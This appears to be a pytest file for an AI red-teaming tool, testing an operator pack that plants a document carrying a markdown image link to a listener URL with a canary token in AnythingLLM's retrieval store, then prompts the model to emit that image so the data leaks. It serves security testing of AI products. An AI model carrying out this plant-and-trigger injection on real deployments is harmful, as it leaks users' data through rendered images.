"""Tests for the AnythingLLM markdown-image exfiltration operator pack
(aginiti/operators/anythingllm_markdown_exfil_definitions.py) --
deterministic-extractor correctness and precondition wiring, no live
server or LLM calls. See that module's docstring for the real research
this primitive is grounded in (Embrace The Red's original markdown-
injection work, EchoLeak/CVE-2025-32711, OWASP 2026 LLM13) and the live
verification already run against the real target.
"""
from aginiti.adapter.observation_adapter import ObservationAdapter
from aginiti.adapters.base import SendResult
from aginiti.graph.schema import ClaimStatus
from aginiti.graph.ssg import SecurityStateGraph
from aginiti.operators.anythingllm_markdown_exfil_definitions import (
    build_anythingllm_markdown_exfil_library,
)


class _ScriptedAgent:
    def __init__(self, responses):
        self._responses = list(responses)
        self.sent = []

    def send(self, channel, prompt):
        self.sent.append((channel, prompt))
        return self._responses.pop(0)

    def ground_truth_mission_achieved(self):
        return False


CANARY = "MD-EXFIL-test789"
LISTENER_BASE = "http://127.0.0.1:8901"
LISTENER_URL = f"{LISTENER_BASE}/verify?token={CANARY}"


def _lib():
    return build_anythingllm_markdown_exfil_library(CANARY, LISTENER_BASE)


def test_plant_operator_embeds_markdown_image_syntax_in_prompt():
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_exfil_document_plant"]
    assert op.channel == "plant"
    assert f"![status]({LISTENER_URL})" in op.prompt


def test_trigger_operator_uses_plain_direct_channel_no_automatic_mode_needed():
    # The whole point of this primitive: it needs only channel="direct"
    # (plain chat), unlike the automatic-mode tool-exfil pack which
    # requires channel="automatic" and a tool-calling-capable provider.
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    assert op.channel == "direct"
    assert op.risk_tier.value == "low"


def test_trigger_precondition_requires_plant_confirmed():
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    ssg = SecurityStateGraph()
    assert op.preconditions_met(ssg) is False
    ssg.assert_claim("anythingllm_markdown_exfil_document_planted", "true", ClaimStatus.CONFIRMED)
    assert op.preconditions_met(ssg) is True


def test_plant_extractor_confirms_on_real_success_shape():
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_exfil_document_plant"]
    ssg = SecurityStateGraph()
    agent = _ScriptedAgent([
        SendResult(final_text="{'success': True, 'error': None, 'documents': [...]}", tool_trace=[]),
    ])
    result = ObservationAdapter().execute(op, ssg, agent)
    assert result.confirmed_keys == ["anythingllm_markdown_exfil_document_planted"]
    assert result.overall_success is True


def test_trigger_confirms_only_when_exact_markdown_image_syntax_present():
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    ssg = SecurityStateGraph()
    agent = _ScriptedAgent([
        SendResult(final_text=f"![status]({LISTENER_URL})\nThe backlog is 12 tickets.", tool_trace=[]),
    ])
    result = ObservationAdapter().execute(op, ssg, agent)
    assert result.confirmed_keys == ["anythingllm_markdown_image_exfil_confirmed"]
    assert result.overall_success is True


def test_trigger_does_not_confirm_from_canary_text_alone_without_markdown_syntax():
    # Guards the same design choice as the automatic-mode pack: merely
    # quoting/describing the retrieved document (which could reproduce the
    # canary as plain text) must not be conflated with the model actually
    # EMITTING the renderable `![...](url)` construct.
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    ssg = SecurityStateGraph()
    agent = _ScriptedAgent([
        SendResult(final_text=f"The document mentions a badge token {CANARY} but no image.", tool_trace=[]),
    ])
    result = ObservationAdapter().execute(op, ssg, agent)
    assert result.confirmed_keys == ["anythingllm_markdown_image_exfil_not_triggered"]
    assert result.overall_success is False


def test_trigger_never_confirms_from_synthetic_recovery_text():
    lib = _lib()
    op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    ssg = SecurityStateGraph()
    agent = _ScriptedAgent([
        SendResult(final_text=f"[synthetic recovery] ![status]({LISTENER_URL})", tool_trace=[], is_synthetic=True),
    ])
    result = ObservationAdapter().execute(op, ssg, agent)
    assert result.confirmed_keys == []
    assert result.overall_success is False


def test_full_plant_then_trigger_sequence_end_to_end():
    lib = _lib()
    plant_op = lib._by_id["anythingllm_markdown_exfil_document_plant"]
    trigger_op = lib._by_id["anythingllm_markdown_image_exfil_trigger"]
    ssg = SecurityStateGraph()
    agent = _ScriptedAgent([
        SendResult(final_text="{'success': True, 'error': None, 'documents': [...]}", tool_trace=[]),
        SendResult(final_text=f"![status]({LISTENER_URL})\nBacklog: 12 tickets.", tool_trace=[]),
    ])
    r1 = ObservationAdapter().execute(plant_op, ssg, agent)
    assert r1.overall_success is True
    assert trigger_op.preconditions_met(ssg) is True
    r2 = ObservationAdapter().execute(trigger_op, ssg, agent)
    assert r2.overall_success is True
    assert agent.sent == [("plant", plant_op.prompt), ("direct", trigger_op.prompt)]
